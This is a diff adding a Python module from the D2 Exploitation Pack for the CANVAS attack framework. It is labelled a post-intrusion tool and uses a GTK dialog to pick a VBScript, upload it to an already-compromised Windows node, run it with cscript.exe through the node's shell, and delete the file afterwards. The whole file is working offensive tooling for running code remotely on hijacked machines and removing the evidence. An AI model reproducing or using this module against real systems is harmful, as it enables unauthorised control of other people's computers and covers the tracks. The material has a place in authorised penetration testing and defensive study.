@@ -1,0 +1,180 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, os
+import pygtk
+import gobject
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "D2 cscript tool"
+DESCRIPTION = "Upload and execute scripts with cscript on a Windows node"
+VERSION = "1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR']=None
+DOCUMENTATION["Date public"]=None
+DOCUMENTATION["CERT Advisory"]=None
+DOCUMENTATION["Repeatability"]="Infinite"
+DOCUMENTATION["References"]=None
+DOCUMENTATION["CVE Name"]=None
+DOCUMENTATION["CVE Url"]=None
+DOCUMENTATION["Notes"]=None
+
+PROPERTY={}
+PROPERTY['TYPE']="Post-Intrusion"
+PROPERTY['SITE']="Local" 
+PROPERTY['ARCH']=[ ["Windows"] ]
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.node = "" 
+		self.host = ""
+		self.dstfile = "c:\\temp\\s.vbs"
+		self.supportedNodeArgs = [["win32Node"]]
+		self.name = NAME
+
+	def cancel(self, widget):
+		self.dlg.destroy()
+
+	def createGUI(self):
+		self.column_names = ['Script', 'Description']
+
+		self.gladefile = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_cscript/dialog2.glade2"	
+		self.wTree = gtk.glade.XML(self.gladefile)
+
+		dic = {"on_cancel_clicked" : self.cancel,
+					"on_upload_clicked" : self.upload_and_exec}
+
+		self.wTree.signal_autoconnect(dic)
+
+		self.dlg = self.wTree.get_widget("cscript_dialog")
+		self.dlg.set_size_request(600, 300)
+		self.dlg.set_icon_from_file(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_cscript/d2.ico")
+
+		self.treeview = self.wTree.get_widget("mytree")
+		self.treeList = gtk.ListStore(str, str)
+		self.treeview.set_model(self.treeList)
+		self.treeselection = self.treeview.get_selection()
+
+		self.column = [None] * len(self.column_names)
+
+		self.column[0] = gtk.TreeViewColumn(self.column_names[0], gtk.CellRendererText(), text=0)
+		self.column[0].set_resizable(True)
+		self.column[0].set_sort_column_id(0)
+
+		self.column[1] = gtk.TreeViewColumn(self.column_names[1], gtk.CellRendererText(), text=1)
+		self.column[1].set_resizable(True)
+		self.column[1].set_sort_column_id(1)
+
+		self.treeview.append_column(self.column[0])
+		self.treeview.append_column(self.column[1])
+
+		self.uploadbutton = self.wTree.get_widget("uploadbutton")
+
+		# Get Entry values
+		self.h = self.wTree.get_widget("host")
+		self.node.getallips()
+		iplist = self.node.interfaces.all_ips()
+		self.h.set_text(iplist[0])
+
+		self.dstfileentry = self.wTree.get_widget("dstfile")
+
+		f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_cscript/vbs.txt", "r")
+		scripts = f.readlines()
+		f.close()
+
+		for e in scripts:
+			if len(e) > 0:
+				e = e[:-1]
+				(sc, desc) = e.split(":")
+				self.treeList.append([sc, desc])
+
+		self.dlg.set_position(gtk.WIN_POS_CENTER_ALWAYS)
+		self.dlg.show()
+
+		return
+
+	def upload_and_exec(self, widget):
+		if (self.treeselection.count_selected_rows() > 0):
+			model, paths = self.treeselection.get_selected_rows()
+
+			for p in paths:
+				iter = self.treeList.get_iter(p)
+				self.script = model.get_value(iter, 0)
+		
+			self.dstfile = self.dstfileentry.get_text()
+			self.host = self.h.get_text()
+
+		if not self.script or not self.dstfile:
+			self.log("[D2 LOG] No script selected")
+		else:
+			self.log("[D2 LOG] Upload %s to %s:%s" % (self.script, self.host, self.dstfile))
+			try:
+				self.node.shell.upload(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_cscript/vbs/" + self.script, "", self.dstfile)
+			except:
+				self.log("[D2 LOG] Can't upload %s to %s" % (self.script, self.dstfile))
+				return
+
+		cmd = "cscript.exe //nologo %s" % self.dstfile
+		str = self.node.shell.runcommand(cmd)
+		self.log("[D2 LOG] %s" % cmd)
+		self.log(str + "\n")
+
+		ret = self.node.unlink(self.dstfile)
+		if not ret:
+			self.log("[D2 LOG] Could not unlink file %s" % self.dstfile)
+
+		return
+
+	def startGUI(self):
+		
+		self.createGUI()
+		
+		return
+
+	def do_gui_operation(self, function, *args, **kw):
+		def idle_func():
+			gtk.gdk.threads_enter()
+			try:
+				function(*args, **kw)
+				return False
+			finally:
+				gtk.gdk.threads_leave()
+
+		gobject.idle_add(idle_func)
+
+	def run(self):
+		# Get version
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			if type not in self.supportedNodeArgs[0]:
+				self.log("[D2 LOG] %s node type not supported"%type)
+				continue
+
+			self.node = node
+
+			# Launch GUI
+			self.do_gui_operation(self.startGUI)
+
+		return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
+
